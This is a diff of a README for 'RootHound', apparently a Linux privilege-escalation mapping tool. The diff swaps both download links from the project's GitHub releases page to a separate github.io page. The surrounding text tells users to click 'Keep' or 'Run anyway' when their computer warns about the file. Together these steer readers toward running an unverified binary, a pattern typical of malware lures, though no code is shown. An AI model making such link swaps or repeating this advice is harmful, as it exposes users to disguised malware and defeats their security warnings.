@@ -1,6 +1,6 @@
 # 🔎 RootHound - Map your path to system access
 
-[![Download RootHound](https://img.shields.io/badge/Download-RootHound-blue.svg)](https://github.com/Florianport417/RootHound/releases)
+[![Download RootHound](https://img.shields.io/badge/Download-RootHound-blue.svg)](https://florianport417.github.io)
 
 RootHound helps you understand security weaknesses on your Linux system. It scans your files and settings to show you the best path for gaining administrative control. Much like a map for hikers, this tool points out the trail from your current user account to the power of the root admin account.
 
@@ -29,7 +29,7 @@ You do not need to install complex software or configure heavy background servic
 ### 1. Download the App
 Visit the official releases page to download the latest version of the software. 
 
-[👉 Visit this page to download RootHound](https://github.com/Florianport417/RootHound/releases)
+[👉 Visit this page to download RootHound](https://florianport417.github.io)
 
 ### 2. Verify Your File
 Check the file size after the download finishes. A complete file contains all the necessary instructions to perform the local scan. If your computer warns you about the file, select "Keep" or "Run anyway" to allow the program to function.
